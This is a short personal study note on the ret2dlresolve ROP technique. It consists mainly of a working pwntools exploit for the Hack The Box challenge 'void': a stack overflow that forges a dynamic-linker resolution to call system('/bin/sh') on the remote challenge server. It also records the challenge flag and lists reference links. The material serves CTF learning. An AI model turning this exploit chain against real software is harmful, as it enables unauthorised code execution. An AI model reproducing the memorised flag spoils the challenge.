---
title: "Ret2Dlresolve (Attacks)"
category: "pwn"
subcategory: "attacks"
type: "technique"
tags: ["my-notes", "personal", "rop", "ret2dlresolve", "pwntools", "pwn"]
summary: "Personal note: Ret2Dlresolve (Attacks)."
source:
  name: "Personal notes"
origin_path: "pwn/Attacks/ret2dlresolve.md"
---

# Challenge - void from HTB
```python
from pwn import *

elf = context.binary = ELF('./void')
# p = elf.process()
p = remote("94.237.50.176", 46901)
rop = ROP(elf)

offset = 72

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw(b"A" * offset)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

p.sendline(rop.chain())
p.sendline(dlresolve.payload)
p.interactive()

# HTB{pwnt00l5_h0mep4g3_15_u54ful}
```
# Resources
- https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html
- https://ir0nstone.gitbook.io/notes/binexp/stack/ret2dlresolve
- https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/ret2dlresolve
- r34r session

---

*From your own notes: `pwn/Attacks/ret2dlresolve.md`*
